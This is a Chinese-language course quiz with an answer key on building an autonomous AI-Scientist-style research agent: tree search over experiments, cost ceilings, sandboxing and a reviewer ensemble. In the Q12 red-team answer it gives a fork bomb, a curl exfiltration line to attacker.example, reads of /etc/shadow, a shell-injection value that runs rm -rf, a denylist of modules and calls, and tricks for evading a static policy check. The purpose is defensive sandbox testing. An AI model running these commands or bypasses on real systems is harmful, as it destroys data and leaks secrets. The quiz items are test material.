# 测验 · 自主研究 Agent——AI-Scientist 级系统（Capstone 05 — Autonomous Research Agent (AI-Scientist Class)）

> **阶段 19 · 综合项目 · 第 05 节** ｜ 讲义：[docs/zh.md](../docs/zh.md)（[English](../docs/en.md)） ｜ 代码：[code/main.py](../code/main.py) ｜ 代码讲解：[code/main.讲解.md](../code/main.讲解.md)
>
> **用法**：学完讲义、跑过代码后，合上讲义完成第二～四部分，再对照第五部分的答案与解析。第一部分是"学完必须能做到"的清单，可以逐项打勾。
>
> 说明：中文讲义为机器翻译，术语有疑义请以英文版为准。

---

## 一、学完本节你应该掌握

### 核心知识点

| # | 知识点 | 一句话要点 |
|---|--------|-----------|
| 1 | 整体形态 | 讲义："plan-execute-verify tree search over experiments, budgeted cost, sandboxed code execution, a vision-feedback LaTeX writer, and an automated NeurIPS-style reviewer ensemble" |
| 2 | 实验树 | 节点 = (hypothesis, config, code, expected outcome)；`expand` 每个子节点只改一个配置；按 novelty × quality × 剩余预算排序，预算耗尽后选最佳分支写论文 |
| 3 | Plan-execute-verify | plan 提出子节点；execute 在沙箱里跑并收集日志与指标；verify 检查"loss 是否下降、消融是否隔离了效应"，失败原因记在树上 |
| 4 | 沙箱 | `docker run --network=none --memory=8g --cpus=2 --pids-limit=256 --read-only`（或 E2B 策略）；固定随机种子；输出只读挂载 |
| 5 | 成本上限 | 每篇论文 $30 硬上限，Langfuse 计数 + 运行前估算；skill 文件：只做事后警告的预算属于 hard reject |
| 6 | 视觉反馈 writer | 生成 LaTeX → 编译 → 把 PDF 交给 VLM（讲义：Claude Opus 4.7 vision）审阅版式、图表可读性、论断与证据是否对齐 |
| 7 | Reviewer ensemble | 5 个 LLM 评审按 NeurIPS 维度（novelty、rigor、clarity、reproducibility、impact）打分；均分 < 4.0/5 退回重写，最多 3 次 |
| 8 | Red team | 复现 Sakana 记录的攻击面：fork bomb、文件系统逃逸、LLM 写出的网络调用与 shell 元字符；必须全部被拦截并记录 |
| 9 | 可复现性 | 每篇论文附树搜索 trace JSON、种子、W&B 链接、沙箱配置，一条命令即可重跑 |
| 10 | 本节代码的真实行为 | 子节点入队时分数全部相同 → 实际是广度优先；`max_nodes` 统计的是入队数，只跑了 4 个实验、花 $5.57；5 个子节点里 2 个与父节点配置完全相同 |

### 核心技能（能动手做到）

- [ ] 用 `heapq` 实现带计数器打破平局的最大优先队列，并说清 `(-score, counter, id)` 三元组的作用
- [ ] 手算 `Node.score`，并指出"未运行的子节点 quality = 0"导致 best-first 退化为 BFS
- [ ] 找出 `expand` 生成重复配置、`max_nodes` 口径、预算只做事后检查等问题，并给出修复
- [ ] 解释为什么"在噪声测量上选 quality 最大的节点"会产生 winner's curse，以及多种子、基线对照的必要性
- [ ] 写出实验沙箱的 docker 参数，并为 fork bomb、网络外传、文件系统逃逸各设计一个 red-team 用例
- [ ] 设计 writer → vision critique → reviewer ensemble 的循环与停止条件

---

## 二、基础自测（选择题）

**Q1.** 讲义中，实验树上的一个节点包含什么？

- A. 一篇完整论文的 LaTeX 源码
- B. 一个 LLM 评审的打分
- C. 一次文献检索的结果列表
- D. 一个实验规格：(hypothesis, config, code, expected outcome)

**Q2.** 本节代码中根节点 `novelty = 1.0`、`quality = 0.5`，剩余预算 $30。`root.score(30)` 是多少？

- A. 0.50
- B. 0.75
- C. 0.65
- D. 1.00

**Q3.** `expand` 产生的子节点在入队时 `novelty = 0.5`（默认值）、`quality = 0.0`，剩余预算大于 $10。它们的分数和后果是：

- A. 都是 0.3；所有子节点同分，按入队计数器先后出队，搜索实际上退化为广度优先
- B. 都是 0.3；但运行后会自动按实测质量重新排序
- C. 各不相同，因为 novelty 是随机的
- D. 都是 0.5；搜索为深度优先

**Q4.** 讲义的沙箱命令 `docker run --network=none --memory=8g --cpus=2 --pids-limit=256 --read-only` 中，专门阻止"实验代码 `curl` 外部地址外传数据"的是：

- A. `--read-only`
- B. `--pids-limit=256`
- C. `--network=none`
- D. `--memory=8g`

**Q5.** 运行 `python main.py`，输出 `nodes explored : 26`。实际在"沙箱"里执行了几个实验？

- A. 26
- B. 4
- C. 22
- D. 5

**Q6.** 关于讲义中的 reviewer ensemble，正确的是：

- A. 一个评审给出 accept/reject 即可
- B. 评审只看代码，不看论文
- C. 只要任意一个评审给出高分就发布
- D. 5 个评审按 NeurIPS 维度打分，均分低于 4.0/5 则带着意见退回 writer，最多重写 3 次

**Q7.** 讲义要求 writer 把编译后的 PDF 交给 VLM 审阅，而不是只审阅 LaTeX 源码。主要原因是：

- A. 只有渲染后才能发现图例太小、版式错乱、图与论断不匹配等问题
- B. VLM 无法读取文本
- C. PDF 比 LaTeX 源码 token 更少
- D. 这样可以跳过 reviewer ensemble

**Q8.** 本节代码在每次 `pop` 之后、运行实验之前检查 `tree.spent >= tree.budget`。关于它的预算控制，说法正确的是：

- A. 它保证总花费永远不会超过 $30
- B. 它在运行前估算每个实验的成本
- C. 这是事后检查：只有花费已经达到或超过预算才停，最后一个实验可能让总额超支；硬上限需要"运行前估算 + 预留"
- D. 预算只影响节点分数，从不终止搜索

---

## 三、动手 / 代码题

**Q9.** "Best-first" 为什么没有 best-first？

```python
    def score(self, remaining_budget: float) -> float:
        budget_weight = min(1.0, remaining_budget / 10.0)
        return self.novelty * 0.4 + self.quality * 0.5 + budget_weight * 0.1

    def push(self, node: Node) -> None:
        self.nodes[node.node_id] = node
        self.counter += 1
        remaining = self.budget - self.spent
        heapq.heappush(self.frontier, (-node.score(remaining), self.counter, node.node_id))
```

1. 分数在什么时候计算？此时子节点的 `quality` 是多少？
2. 实际出队顺序是怎样的？用运行结果说明。
3. 讲义 Key Terms 说节点按 "novelty×quality×budget" 打分，代码用的是加权和。两者在"quality 为 0"时有什么不同？
4. 给出一种修复，让好节点的子节点优先被探索。

**Q10.** 重复实验与 winner's curse：

```python
def expand(node, next_id):
    base_cfg = node.config
    for sp in (4, 8, 16):
        cfg = dict(base_cfg, sparsity_top=sp)
        ...
    for lr in (3e-4, 1e-3):
        cfg = dict(base_cfg, lr=lr)
        ...
```

1. 根节点配置为 `{"sparsity_top": 8, "lr": 3e-4}`，它的 5 个子节点中哪些与父节点配置完全相同？
2. 默认运行的最佳分支是 `#04 lr=0.0003, q=0.86`，这个"最佳实验"实际上验证了什么假设？
3. 在 `run_experiment` 中，`lr` 从 3e-4 改为 1e-3 会让 loss 增加多少？与噪声 `gauss(0, 0.05)` 相比如何？
4. 把 `max_nodes` 设得足够大让搜索一直跑到预算耗尽：共执行 22 个实验，其中有多少种不同配置？最佳分支选中了 `lr=0.001, q=0.923`，这个结论可信吗？

**Q11.** 搜索终止条件与预算：

1. `while tree.frontier and len(tree.nodes) < tree.max_nodes` 中 `len(tree.nodes)` 统计的是什么？为什么默认运行只花了 $5.57？
2. 不限制 `max_nodes` 时，最终花费是多少？是否违反 $30 硬上限？
3. 写出修复：按"已执行实验数"限流、去重配置、运行前用成本估算判断是否还能负担下一次实验。修复后（种子仍为 7）结果如何？

**Q12.** 沙箱与策略层：讲义要求"The agent's code-generation step passes through a policy layer that blocks syscalls that escape the sandbox"，并做 red team。

1. 为 fork bomb、网络外传、读取宿主机敏感文件、shell 元字符注入各写一个 red-team 用例，并说明分别由哪条沙箱配置拦截。
2. 写一个基于 `ast` 的静态策略检查函数，拒绝导入 `socket`/`subprocess` 等模块、调用 `os.system`/`os.fork` 等函数。
3. 静态检查能被绕过吗？举例并说明为什么仍然需要容器层面的隔离。

---

## 四、面试高频题

**Q13.**（基础必考）请描述一个 AI-Scientist 类自主研究 agent 的端到端流程，并说出每个阶段最关键的失败模式。

**Q14.**（原理深挖）实验树搜索的打分函数应该怎么设计？加权和与乘积有何不同？如何在 exploitation（深挖好分支）与 exploration（尝试新方向）之间平衡？讲义提到的 AB-MCTS 风格解决什么问题？

**Q15.**（工程实践）让 LLM 生成并执行实验代码，你会如何设计沙箱与 red team？请给出具体的隔离层次和验证方法。

**Q16.**（场景设计）预算只有 $30/篇。如何设计成本控制，使系统既不超支、又不会因为过早停止而浪费机会？讲义练习 2 要求对估算超过 $5 的节点加人工审批，你怎么实现？

**Q17.**（追问型）"让 5 个 LLM 评审打分，均分 ≥ 4.0 就发布"——这个闸门有什么风险？如何验证评审 ensemble 本身是可靠的？

---

## 五、参考答案与解析

### Q1 — 答案：D

讲义 Concept："Nodes are experiment specifications: (hypothesis, config, code, expected outcome)." `expand` 对节点做小幅修改生成子节点，每个子节点在全新的沙箱里运行。本节代码的 `Node` 简化为 `hypothesis`、`config`、`result`、`cost_usd`、`novelty`、`quality`、`failure`，没有 `code` 与 `expected outcome`。

- A 是 writer 的产物；B 是 reviewer 的产物；C 是文献检索阶段的产物。

### Q2 — 答案：B

`budget_weight = min(1.0, 30/10) = 1.0`；`score = 1.0 × 0.4 + 0.5 × 0.5 + 1.0 × 0.1 = 0.4 + 0.25 + 0.1 = 0.75`（已实际打印验证）。

- A 只算了 quality；C 少算了 budget 项；D 只算了 novelty。

### Q3 — 答案：A

`0.5 × 0.4 + 0 × 0.5 + 1.0 × 0.1 = 0.3`，5 个子节点完全同分（实际打印 `[0.3, 0.3, 0.3, 0.3, 0.3]`）。`heapq` 比较元组时，第一项相同就比较第二项 `counter`，先入队的先出队，于是变成 FIFO，即广度优先。

- B 错：分数在 `push` 时就固定在堆里，运行后的 quality 从不回写到兄弟节点或子节点的优先级上。
- C 错：子节点的 novelty 在运行前是默认值 0.5，随机 novelty 是在 `run_experiment` 里才赋值的。
- D 错。

### Q4 — 答案：C

`--network=none` 让容器只有 loopback，没有外网接口，`curl` 直接失败（讲义练习 4）。

- A `--read-only` 防止写入容器根文件系统；B `--pids-limit=256` 限制进程数，防 fork bomb；D `--memory=8g` 限制内存，超出由 cgroup OOM kill（代码中模拟的失败原因正是 `oom_killed_by_cgroup`）。

### Q5 — 答案：B

实际运行只打印了 4 行 `[ok ] node #01`～`#04`。`len(tree.nodes)` 统计的是**入队**的节点：根 1 个 + 每次展开 5 个，`1 + 5 × 5 = 26`；第 4 个实验展开后达到 26 ≥ 24，循环结束。"nodes explored" 这个标签具有误导性，22 个节点只是被提出、从未执行。

- C（22）是不限制 `max_nodes`、一直跑到预算耗尽时的实验数。

### Q6 — 答案：D

讲义 Build It 第 7 步："Five judges score the draft on (novelty, rigor, clarity, reproducibility, impact) with NeurIPS-style rubrics. If mean < 4.0/5, return to writer with critique. Hard stop after 3 rewrites." skill 文件补充：均分低于 4.0 时，没有人工明确覆盖就拒绝发布。

### Q7 — 答案：A

讲义 Key Terms "Vision critique — Render-then-read"：编译成 PDF 再交给 VLM 审阅版式和 claim-evidence 对齐。很多问题只有渲染后才存在：图例太小、表格溢出、图片放错位置、正文说"图 2 显示下降"而图 2 实际是上升。skill 文件把"不重新读取编译后 PDF 的 writer"列为 hard reject。

- B 错，VLM 能读文本；C 不是目的；D 错，vision critique 与 reviewer ensemble 是两道独立的闸门。

### Q8 — 答案：C

检查发生在"已经花掉"之后：只要 `spent < budget` 就允许再跑一个实验，而实验成本是 1.2～1.6 美元。我们把 `max_nodes` 设得很大，搜索在 `cum=$30.96` 之后才打印 `BUDGET EXHAUSTED`，超支 $0.96。skill 文件的 hard reject："Cost budgets enforced only as post-hoc warnings, not hard ceilings." 讲义要求 "Langfuse counters + pre-run estimates"。

- A、B 都不成立；D 错，预算确实会终止循环，只是晚了一步。

### Q9 — 参考答案

1. 分数在 `push`（入队）时计算并写进堆，此时子节点还没运行，`quality = 0.0`、`novelty = 0.5`，所以全都是 0.3。之后即使运行出了好结果，堆里的优先级也不会更新。
2. 实际出队顺序：`#01, #02, #03, #04`（默认运行），不限制节点数时为 `#01, #02, …, #22`，严格按编号递增——这就是广度优先：先把根的 5 个子节点跑完，再按顺序跑 #01 的子节点、#02 的子节点……与父节点表现好坏无关。
3. 乘积 `novelty × quality × budget` 在 quality = 0 时整体为 0，未运行节点全部同分为 0，问题同样存在；加权和至少让 novelty 和 budget 项有区分度，但由于 novelty 也是默认值，结果仍是平局。两种形式都说明：**未评估节点需要一个先验分数**。
4. 修复：用父节点的实测表现作为子节点的先验优先级（"好分支的子节点先探索"），再加一点探索项：
   ```python
   for ch in expand(cur, next_id):
       prior = 0.4 * cur.novelty + 0.5 * cur.quality      # 继承父节点实测结果
       prior += 0.1 * rng.random()                        # 小随机项打破平局、鼓励探索
       counter += 1
       heapq.heappush(frontier, (-prior, counter, ch.node_id))
   ```
   更进一步可以用 UCB 式的分数 `mean_quality + c·sqrt(ln N / n_child)`，在"深挖好分支"与"试新分支"之间平衡（见 Q14）。

### Q10 — 参考答案

1. 实际打印的子节点配置：`{sp:4, lr:3e-4}`、`{sp:8, lr:3e-4}`、`{sp:16, lr:3e-4}`、`{sp:8, lr:3e-4}`、`{sp:8, lr:1e-3}`。第 2 个（"sparsity top-8"）和第 4 个（"lr=0.0003"）都与父节点**完全相同**——`dict(base_cfg, sparsity_top=8)` 把 8 改成 8，等于没改。
2. 它与根节点配置完全相同，什么新假设都没验证，只是**把基线又跑了一遍**，靠噪声拿到最高质量（loss 2.712）。最佳分支的 hypothesis "lr=0.0003" 读起来像是一个发现，实际上是一次重复。
3. `0.0001 × |1e-3 − 3e-4| × 1000 = 7 × 10⁻⁵`，比噪声标准差 0.05 小约 700 倍，学习率在这个模拟中**几乎没有影响**（作者可能想写成 `abs(lr − 3e-4) / 3e-4 × 0.1` 之类的量级）。真正有影响的只有 sparsity：sp=8 → 2.70，sp=4 → 2.775，sp=16 → 2.85。
4. 实际运行：22 个实验只有 **6 种**不同配置（3 种 sparsity × 2 种 lr），其余都是重复。最佳分支选中 `#05 lr=0.001, q=0.923`（对应 loss ≈ 2.615），而 sp=8 的真实 loss 是 2.70，这次只是比均值低了约 1.7 个标准差的幸运测量。在大量重复的噪声测量中挑最大值，必然高估效果，这就是 **winner's curse**。可信的做法：
   - 去重：相同配置只跑一次，或者有意地多种子重复并取均值；
   - 每个配置跑多个种子，报告均值和置信区间（skill 文件的评分项 "Baselines, seeds, ablations"）；
   - 始终包含基线对照，用"相对基线的提升是否超出噪声"来判断；
   - 最终结论用独立的复现运行（新种子）确认。

### Q11 — 参考答案

1. 统计的是**入队**节点数（含从未执行的），而不是执行的实验数。每次展开加 5 个，4 次实验后就达到上限，所以只花了 $5.57，剩余 $24 预算被浪费；讲义的设计是 "The tree grows until budget is exhausted"。
2. 实际运行：执行 22 个实验，花费 **$30.96**，超出 $30 上限 $0.96，然后才打印 `BUDGET EXHAUSTED at $30.96`。
3. 修复示例（已运行验证）：
   ```python
   def tree_search_fixed(seed, rng, budget=30.0, max_runs=40, est_cost=1.6):
       root = Node(0, None, seed, {"sparsity_top": 8, "lr": 3e-4})
       root.novelty, root.quality = 1.0, 0.5
       nodes, seen = {0: root}, {tuple(sorted(root.config.items()))}
       frontier, counter, spent, runs, next_id = [], 0, 0.0, 0, 1

       def add_children(parent, prior):
           nonlocal counter, next_id
           for ch in expand(parent, next_id):
               next_id += 1
               key = tuple(sorted(ch.config.items()))
               if key in seen:                      # 去重：相同配置不再跑
                   continue
               seen.add(key); nodes[ch.node_id] = ch
               counter += 1
               heapq.heappush(frontier, (-prior, counter, ch.node_id))

       add_children(root, root.quality)
       while frontier and runs < max_runs:          # 按"已执行数"限流
           if spent + est_cost > budget:            # 运行前估算：付不起就不跑
               break
           _, _, nid = heapq.heappop(frontier)
           cur = nodes[nid]
           run_experiment(cur, rng); spent += cur.cost_usd; runs += 1
           if verify(cur):
               add_children(cur, 0.4 * cur.novelty + 0.5 * cur.quality)
       return nodes, spent, runs
   ```
   结果：执行 5 个实验、花费 $7.00、5 种配置互不相同，然后 frontier 为空自然结束。这暴露了另一个事实：`expand` 定义的搜索空间只有 3 × 2 = 6 个配置点（根配置被去重、并未单独运行），对这么小的空间做"树搜索"并无意义，网格搜索就够了。真实系统的 `expand` 由 LLM 提出开放式修改（换优化器、消融组件、改数据），空间大得多，去重也需要语义层面的判断。另外 `est_cost` 应取历史成本的高分位数（代码中实验成本最大为 1.6），才能保证不超支。

### Q12 — 参考答案

1. red-team 用例与拦截机制：

   | 用例 | 示例代码 | 拦截配置 |
   |------|---------|---------|
   | fork bomb | `while True: os.fork()` | `--pids-limit=256`（进程数上限），配合 `--cpus=2` |
   | 网络外传 | `subprocess.run("curl -d @data http://attacker.example", shell=True)` | `--network=none` |
   | 读宿主机敏感文件 / 写出容器 | `open("/etc/shadow")`、写 `../../host/` | 容器文件系统隔离 + `--read-only`，只挂载需要的数据卷（只读）、输出卷单独挂载 |
   | shell 元字符注入 | LLM 生成 `os.system(f"python train.py --name {name}")`，`name = "x; rm -rf /data"` | 策略层禁止 `os.system`/`shell=True`，参数以列表形式传递；容器内以非 root 运行 |
   | 资源耗尽 | 分配 100GB 张量 | `--memory=8g`，cgroup OOM kill |

   每个用例都要**实际执行**并记录"被拦截"的证据（skill 文件："Refuse to rerun a paper whose red-team has not been executed and logged"）。

2. 参考实现（已运行验证）：
   ```python
   import ast
   BANNED_MODULES = {"socket", "subprocess", "urllib", "requests", "http", "ctypes", "shutil"}
   BANNED_CALLS = {"os.system", "os.fork", "os.popen", "os.execv", "eval", "exec", "__import__"}

   def policy_check(src: str) -> list[str]:
       problems = []
       for node in ast.walk(ast.parse(src)):
           if isinstance(node, (ast.Import, ast.ImportFrom)):
               names = ([a.name for a in node.names] if isinstance(node, ast.Import)
                        else [node.module or ""])
               for n in names:
                   if n.split(".")[0] in BANNED_MODULES:
                       problems.append(f"line {node.lineno}: import {n}")
           elif isinstance(node, ast.Call):
               f = node.func
               name = (f"{f.value.id}.{f.attr}"
                       if isinstance(f, ast.Attribute) and isinstance(f.value, ast.Name)
                       else f.id if isinstance(f, ast.Name) else "")
               if name in BANNED_CALLS:
                   problems.append(f"line {node.lineno}: call {name}")
       return problems
   ```
   对一段包含 `import subprocess`、`os.fork()`、`open("/etc/passwd")` 的测试代码，它报告了 `import subprocess` 和 `call os.fork`（我们额外加的路径规则还报告了 `/etc/passwd`）。

3. 能被绕过。例如 `getattr(os, "sys" + "tem")("ls")`、`importlib.import_module("sub" + "process")`、通过 `ctypes` 直接调用 libc、或写出一个 shell 脚本再借训练框架的回调执行——我们的测试中 `getattr` 那一行就**没有**被检出。静态检查只是第一道、成本最低的过滤；真正的安全边界必须在内核层面（容器命名空间、cgroups、seccomp 系统调用过滤、无网络、只读文件系统、非 root 用户）。这就是纵深防御：策略层减少明显的恶意尝试并留下审计日志，沙箱保证即使策略层被绕过也无法造成危害。

### Q13 — 参考回答要点

- **流程**（对应讲义架构）：
  1. 种子想法 + 领域界定（模型、数据集、算力预算）；
  2. 文献检索（Semantic Scholar + OpenAlex，取 50 篇高引论文，缓存摘要，生成 1 页领域综述）；
  3. 实验树搜索：plan（提出子实验）→ execute（沙箱执行）→ verify（检查指标合理性），按 novelty × quality × budget 打分；
  4. 选最佳分支 → writer 生成 LaTeX、渲染图表、编译、VLM 审阅、迭代；
  5. reviewer ensemble 打分，不达标退回；
  6. 产出 paper.pdf + review.md + trace.json，以及 red-team 报告。
- **关键失败模式**：
  - 文献：novelty 判断依赖检索覆盖率，漏检会把已有工作当成新发现；
  - 树搜索：重复实验、噪声中挑最大值（winner's curse）、没有基线；
  - 执行：代码 bug 导致"假结果"，沙箱逃逸、资源耗尽；
  - 写作：论断超出证据、图文不一致、幻觉引用；
  - 评审：LLM 评审对流畅文本打高分（见 Q17）；
  - 成本：预算失控。
- 加分点：说出讲义的 Use It 示例流程与 $28.40 的花费；指出 verify 步骤应检查"消融是否真正隔离了效应"。

### Q14 — 参考回答要点

- **加权和**（代码：`0.4·novelty + 0.5·quality + 0.1·budget`）：各项可互相补偿，一个高 novelty、低 quality 的节点仍可能被选中；权重直观、可调。
- **乘积**（讲义 Key Terms）：任一项接近 0 则整体接近 0，相当于"必须同时满足"；但对未评估节点（quality 未知）不友好，需要先验。
- **探索与利用**：
  - 纯贪心（只扩展当前最好的节点）容易陷入局部最优，且在噪声测量下会追逐幸运值；
  - 纯 BFS（本节代码的实际行为）浪费预算在差分支上；
  - 常用做法：UCB / PUCT 式打分 `Q̄ + c·√(ln N / n)`，或 Thompson sampling；对测量噪声大的实验，用多种子均值作为 `Q̄`。
- **AB-MCTS 风格**（讲义 Stack："AB-MCTS-style from Sakana v2"）：要决定的不只是"扩展哪个节点"，还有"往宽处走（生成新的兄弟方案）还是往深处走（在已有方案上继续改进）"，用自适应的方式在两种扩展之间分配预算。
- **budget 项的作用**：剩余预算少时降低昂贵或高风险实验的优先级，偏向收尾；代码中 `min(1, remaining/10)` 只在最后 $10 才起作用，而且所有节点同时变化，对排序几乎没有影响。

### Q15 — 参考回答要点

- **隔离层次**：
  1. 进程级：每个实验一个全新容器 / microVM（E2B、Daytona、Firecracker），用完即毁；
  2. 网络：`--network=none`，数据以只读卷提供（skill 文件：需要网络的种子想法应改为挂载只读数据集）；
  3. 资源：cgroups 限制 CPU、内存、PID 数、磁盘配额、墙钟时间；
  4. 文件系统：`--read-only` 根文件系统、最小挂载、输出卷单独挂载；
  5. 权限：非 root、丢弃 capabilities、seccomp 过滤危险系统调用；
  6. 策略层：代码执行前的静态检查与审计日志（Q12）；
  7. Kill switch：可随时终止所有实验与 agent 主循环（评分标准的 Safety 项要求验证）。
- **red team 验证**：维护一组对抗任务（fork bomb、curl 外传、路径逃逸、shell 元字符、资源耗尽、读取环境变量中的密钥），每次修改沙箱配置后在 CI 中全部跑一遍，断言被拦截，并记录日志；也要测试"LLM 被诱导写出恶意代码"的场景，而不只是手写恶意代码。
- **可复现**：固定种子写入沙箱、镜像固定版本（digest）、记录全部配置到 trace。
- 常见误区：只依赖 prompt 里"不要访问网络"之类的指令——讲义强调 "Safety is load-bearing"，必须由基础设施强制。

### Q16 — 参考回答要点

- **事前估算**：每个节点运行前根据配置估算成本（模型大小 × 步数 × 单价，或历史同类实验的 P90 成本），`spent + reserved + estimate > budget` 就不运行。
- **预留**：为 writer、vision critique、reviewer ensemble 预留固定额度（例如 $5），实验阶段只能用剩下的部分；否则实验把预算花光后论文写不出来。
- **硬上限**：实验在沙箱里设墙钟超时；LLM 调用设 `max_tokens`；网关层（Langfuse/AI gateway 计数）超额后直接拒绝请求，而不是事后告警。
- **避免过早停止**：按"预期价值 / 成本"排序节点；便宜的探索性实验先跑，贵的验证性实验只在有希望的分支上跑；剩余预算接近 0 时优先完成写作。
- **人工审批（讲义练习 2）**：估算 > $5 的节点进入"待审批"状态，LangGraph 的 human-approval gate 中断执行等待批准；未批准前继续处理其它节点；统计加闸门前后的总成本。
- 加分点：用成本台账（skill 文件要求输出 cost-ledger）记录每次调用，事后分析各阶段成本占比。

### Q17 — 参考回答要点

- **风险**：
  - LLM 评审偏好流畅、自信、长的文本，对实验缺陷（缺基线、数据泄露、统计不显著）不敏感；
  - 评审之间相关性高（相似的训练数据、相似的偏好），5 个评审并不等于 5 个独立意见；
  - 被优化的对象会过拟合评审：writer 在"退回—重写"循环中学会写出讨好评审的文字（Goodhart 定律 / reward hacking）；
  - 评审可能与 writer 来自同一模型家族，存在自我偏好。
- **验证方法**：
  - 讲义练习 3：准备一组已知质量差的论文（以及已发表的好论文），测 false-accept / false-reject 率，比较单评审与 ensemble；
  - 与人类评审打分做相关性分析；
  - 注入已知缺陷（删掉基线、伪造结果表中的一个数）看评审能否发现；
  - 评审看不到 writer 的推理过程，并给评审提供实验 trace 与结果表，检查"每个论断是否对应结果表中的一个单元格"（评分标准的 rigor 项）。
- **兜底**：均分 < 4.0 不发布；即使 ≥ 4.0，发表前也应有人工审阅（skill 文件要求低分发布需要明确的人工覆盖）。

---

## 六、关联知识点

### 前置知识
- [阶段 14 · 02 ReWOO 与 Plan-and-Execute：解耦 Planning](../../../14-agent-engineering/02-rewoo-plan-and-execute/docs/zh.md)：plan-execute-verify 循环的基础。
- [阶段 14 · 04 Tree of Thoughts 与 LATS：审慎搜索](../../../14-agent-engineering/04-tree-of-thoughts-lats/docs/zh.md)：在"想法/实验树"上做搜索与打分。
- [阶段 15 · 05 AI Scientist v2：达到研讨会论文水平的自主研究](../../../15-autonomous-systems/05-ai-scientist-v2/docs/zh.md)：本节直接对标的系统。
- [阶段 15 · 13 行动预算、迭代上限与成本控制](../../../15-autonomous-systems/13-cost-governors/docs/zh.md)：$30 硬上限的设计方法。
- [阶段 15 · 14 紧急停止开关、Circuit Breakers 与金丝雀 Tokens](../../../15-autonomous-systems/14-kill-switches-canaries/docs/zh.md)：评分标准中的 kill switch。
- [阶段 11 · 16 Agent State Machines——图、节点与 Checkpoints](../../../11-llm-engineering/16-langgraph-state-machines/docs/zh.md)：讲义用 LangGraph 编排并设置人工审批闸门。

### 本节被哪些后续内容用到
- [阶段 19 · 50 研究假设生成器](../../50-hypothesis-generator/docs/zh.md)、[阶段 19 · 52 实验执行器](../../52-experiment-runner/docs/zh.md)、[阶段 19 · 55 Critic 评审循环](../../55-critic-loop/docs/zh.md)、[阶段 19 · 57 端到端研究演示](../../57-end-to-end-research-demo/docs/zh.md)：把本节各组件拆开逐一实现。
- [阶段 19 · 26 带拒绝列表与路径隔离的 Sandbox 执行器](../../26-sandbox-runner-denylist/docs/zh.md)：策略层与沙箱的具体实现。
- [阶段 18 · 02 奖励投机与古德哈特定律](../../../18-ethics-safety-alignment/02-reward-hacking-goodhart/docs/zh.md)：writer 过拟合 reviewer ensemble 的风险。
- [阶段 16 · 08 角色专业化：规划者、Critic、执行者与验证者](../../../16-multi-agent-and-swarms/08-role-specialization/docs/zh.md)：writer / reviewer / executor 的角色分工。

### 延伸关键词
`AI-Scientist-v2` · `Agent Laboratory` · `best-first search` · `AB-MCTS` · `UCB / PUCT` · `winner's curse` · `multiple seeds` · `E2B / Daytona` · `--network=none` · `cgroups / seccomp` · `red team` · `LLM-as-judge` · `reviewer ensemble` · `cost ceiling` · `reproducibility bundle`
